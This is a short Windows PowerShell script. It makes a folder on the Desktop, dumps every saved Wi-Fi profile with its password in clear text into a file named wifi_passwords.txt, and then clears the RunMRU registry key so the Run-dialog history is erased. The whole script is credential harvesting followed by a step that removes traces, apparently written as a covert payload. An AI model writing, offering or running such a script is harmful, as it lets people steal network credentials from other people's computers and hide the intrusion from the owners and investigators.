cd $env:USERPROFILE\Desktop;
New-Item -ItemType Directory -Name "NewFolder4";
cd NewFolder4;


(netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    $name = $_ -replace '^\s+All User Profile\s+:\s+', ''; 
    (netsh wlan show profile name="$name" key=clear) 
} | Select-String "Key Content\W+:(.+)$" | ForEach-Object {
    $pass = $_ -replace '^\s+Key Content\s+:\s+', ''; 
    [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
} | Format-Table -AutoSize | Out-File wifi_passwords.txt;



Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
